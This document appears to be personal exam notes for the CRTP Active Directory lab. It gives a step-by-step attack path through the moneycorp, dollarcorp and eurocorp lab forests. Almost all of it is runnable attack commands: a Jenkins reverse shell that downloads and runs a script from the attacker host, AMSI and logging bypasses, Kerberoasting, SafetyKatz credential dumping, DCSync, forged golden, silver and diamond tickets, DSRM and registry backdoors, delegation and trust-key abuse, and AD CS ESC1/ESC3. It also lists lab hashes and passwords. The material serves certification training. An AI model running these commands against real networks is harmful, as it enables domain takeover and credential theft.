# 🎓 Exam-Master-Notes-CRTP

> Follow top to bottom. Each phase links to the detailed cheatsheet or lab notes.
>
> Forest: `moneycorp.local` → Child: `dollarcorp.moneycorp.local` → External: `eurocorp.local`
>
> All tools at `C:\AD\Tools\`. Student VM IP: `172.16.100.X`

***

## 0. Setup — Every new shell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

> Admin shell? Use `RunWithPathAsAdmin.bat` instead. Import ADModule if needed:

```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

***

## 1. Enumeration

> Full details → [cheatsheet-fast-commands-enumeration.md](cheatsheet-fast-commands-enumeration.md)

### Domain basics

```
Get-Domain
Get-DomainUser | select -ExpandProperty samaccountname
Get-DomainComputer | select -ExpandProperty dnshostname
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

### Find local admin access

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

### SPNs (Kerberoastable accounts)

```
Get-DomainUser -SPN
```

### Trusts

```
Get-DomainTrust
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

### Delegation

```
Get-DomainComputer -Unconstrained | select name
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### ACLs — find interesting permissions for your user

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

### AD CS

```
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Certify.exe find /vulnerable
```

***

## 2. Local Privilege Escalation

> Full details → [cheatsheet-fast-commands-privilege-escalation.md](cheatsheet-fast-commands-privilege-escalation.md) Lab notes → [LO5](learning-objectives/learning-objetive-5.md)

```
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

If `AbyssWebServer` service found:

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```

> Re-login after service abuse to get local admin.

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

***

## 3. Lateral Movement — Get to ciadmin / dcorp-ci

> Full details → [cheatsheet-fast-commands-lateral-movement.md](cheatsheet-fast-commands-lateral-movement.md) Lab notes → [LO5](learning-objectives/learning-objetive-5.md) | [LO6](learning-objectives/learning-objetive-6.md)

### Jenkins (dcorp-ci — 172.16.3.11:8080)

Login: `builduser : builduser` — Create/modify a project, add Windows Batch command:

```
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

Start listener first: `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`

Once you have shell as `ciadmin` on dcorp-ci, load bypasses:

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/sbloggingbypass.txt'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Amsi-Byp.txt'))
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```

### GPO Abuse (if needed — alternative path to local admin on dcorp-ci)

> Lab notes → [LO6](learning-objectives/learning-objetive-6.md) | Full steps in [cheatsheet-fast-commands-lateral-movement.md](cheatsheet-fast-commands-lateral-movement.md)

***

## 4. Kerberoasting → svcadmin password

> Lab notes → [LO7](learning-objectives/learning-objtetive-7.md)

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

> Edit hashes.txt — remove `:1433` from the SPN line before cracking.

```
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
## svcadmin : *ThisisBlasphemyThisisMadness!!
```

***

## 5. OverPass-the-Hash → DA shell

> Lab notes → [LO7](learning-objectives/learning-objtetive-7.md)

> Run from elevated cmd (Run as administrator)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

> New cmd window opens as svcadmin (Domain Admin). All DA operations below from this window.

***

## 6. Credential Dump — dcorp-adminsrv

> Lab notes → [LO7](learning-objectives/learning-objtetive-7.md)

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-adminsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

> Save these:
>
> * `appadmin` aes256: `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb`
> * `websvc` aes256: `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7`
> * `dcorp-adminsrv$` aes256: `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51`

***

## 7. DCSync — Extract krbtgt hash

> Lab notes → [LO12](learning-objectives/learning-objetive-12.md)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

> krbtgt AES256: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` Domain SID: `S-1-5-21-719815819-3726368948-3917688648`

Also dump dcorp-dc$ machine hash (needed for Silver Ticket):

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
```

***

## 8. Tickets — Golden / Silver / Diamond

> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md) Lab notes → [LO8](learning-objectives/learning-objetive-8.md) | [LO9](learning-objectives/learning-objetive-9.md) | [LO10](learning-objectives/learning-objetive-10.md)

### Golden Ticket

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
## Copy generated command, add -path C:\AD\Tools\Rubeus.exe -args and /ptt at end
winrs -r:dcorp-dc cmd
```

### Silver Ticket (HTTP/WinRM)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

### Diamond Ticket

> Elevated shell required

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
winrs -r:dcorp-dc cmd
```

***

## 9. Persistence

> Full details → [cheatsheet-fast-commands-persistence.md](cheatsheet-fast-commands-persistence.md) Lab notes → [LO11](learning-objectives/learning-objetive-11.md) | [LO13](learning-objectives/learning-objetive-13.md)

### DSRM (LO11)

```
## As DA: copy Loader to DC, connect, extract SAM hash
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
## Get DSRM Admin hash: a102ad5753f4c441e3af31c97fad86fd

## Modify registry on DC to allow remote DSRM login
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

From student VM (elevated PS):

```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
## In new cmd:
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

### Security Descriptors — WMI/PSRemoting without DA (LO13)

```
## As DA:
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
```

***

## 10. Domain Escalation — Unconstrained Delegation → EA

> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md) Lab notes → [LO15](learning-objectives/learning-objetive-15.md)

### Find unconstrained delegation machine

```
Get-DomainComputer -Unconstrained | select name
## dcorp-appsrv
```

### Get admin on dcorp-appsrv (via appadmin)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
## In new cmd:
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
## Should show dcorp-appsrv
```

### Run Rubeus monitor on dcorp-appsrv

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-appsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

### Trigger coercion (from student VM, separate cmd)

```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
## Or:
C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
## Or:
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

### Import TGT of dcorp-dc$ and DCSync (elevated cmd)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:BASE64TICKET
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

### Escalate to Enterprise Admin — target mcorp-dc$

```
## Change monitor target to MCORP-DC$
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
## Coerce from student VM:
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
## Import and DCSync:
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:BASE64TICKET
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

***

## 11. Constrained Delegation (LO16)

> Lab notes → [LO16](learning-objectives/learning-objetive-16.md)

### websvc → CIFS/dcorp-mssql

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

### dcorp-adminsrv$ → ldap/dcorp-dc (→ DCSync)

> Elevated cmd required for SafetyKatz

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

***

## 12. RBCD / ACL Write (LO17)

> Lab notes → [LO17](learning-objectives/learning-objetive-17.md)

ciadmin has GenericWrite on dcorp-mgmt. From Jenkins reverse shell (ciadmin):

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-stdX$' -Verbose
Get-DomainRBCD
```

Get AES key of student VM machine account (elevated cmd):

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
## dcorp-stdX$ AES256: 5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c (example)
```

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-stdX$ /aes256:YOURAES256 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd
```

***

## 13. Cross-Forest Escalation — mcorp via Trust Key (LO18)

> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md) Lab notes → [LO18](learning-objectives/learning-objetive-18.md)

### Extract trust key (dcorp → mcorp)

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
## [ In ] DOLLARCORP -> MONEYCORP: rc4: 132f54e05f7c3db02e97c00ff3879067
```

### Forge inter-realm ticket

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:132f54e05f7c3db02e97c00ff3879067 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
## Copy base64 ticket
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:BASE64HERE
winrs -r:mcorp-dc.moneycorp.local cmd
```

***

## 14. Cross-Forest Escalation — mcorp via krbtgt hash (LO19)

> Lab notes → [LO19](learning-objectives/learning-objetive-19.md)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
winrs -r:mcorp-dc.moneycorp.local cmd
## DCSync against moneycorp:
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

***

## 15. External Forest — eurocorp SharedwithDCorp (LO20)

> Lab notes → [LO20](learning-objectives/learning-objetive-20.md)

### Extract trust key (dcorp → eurocorp)

```
## From dcorp-dc winrs session with portproxy:
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
## [ In ] DOLLARCORP -> EUROCORP aes256: a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac
```

### Forge referral ticket (NO SID History — filtered on external trusts)

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:BASE64HERE
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

***

## 16. AD CS — ESC1 / ESC3 (LO21)

> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md) Lab notes → [LO21](learning-objectives/learning-objective-21.md)

### ESC1 — DA (template: HTTPSCertificates)

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
## Save pem → convert to pfx (pass: SecretPass@123)
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
winrs -r:dcorp-dc cmd /c set username
```

### ESC1 — EA (same template, different SID)

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
## Save to esc1-EA.pem → pfx → TGT
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
winrs -r:mcorp-dc cmd /c set username
```

### ESC3 — DA via enrollment agent

```
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
## Save to esc3.pem → pfx
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
## Save to esc3-DA.pem → pfx → TGT
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
winrs -r:dcorp-dc cmd /c set username
```

***

## Quick Reference — Key Hashes & SIDs

| Account                           | AES256                                                             | NTLM / RC4                         |
| --------------------------------- | ------------------------------------------------------------------ | ---------------------------------- |
| svcadmin                          | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011` | —                                  |
| krbtgt (dcorp)                    | `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` | `4e9815869d2090ccfca61c1fe0d23986` |
| dcorp-dc$                         | —                                                                  | `c6a60b67476b36ad7838d7875c33c2c3` |
| DSRM Admin (dcorp-dc)             | —                                                                  | `a102ad5753f4c441e3af31c97fad86fd` |
| appadmin                          | `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb` | —                                  |
| websvc                            | `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7` | —                                  |
| dcorp-adminsrv$                   | `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51` | —                                  |
| Trust key dcorp→mcorp (rc4)       | —                                                                  | `132f54e05f7c3db02e97c00ff3879067` |
| Trust key dcorp→eurocorp (aes256) | `a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac` | —                                  |
| krbtgt (mcorp)                    | —                                                                  | `a0981492d5dfab1ae0b97b51ea895ddf` |

| Name                  | Value                                            |
| --------------------- | ------------------------------------------------ |
| Domain SID (dcorp)    | `S-1-5-21-719815819-3726368948-3917688648`       |
| Enterprise Admins SID | `S-1-5-21-335606122-960912869-3279953914-519`    |
| DC IP (dcorp-dc)      | `172.16.2.1`                                     |
| CA                    | `mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` |
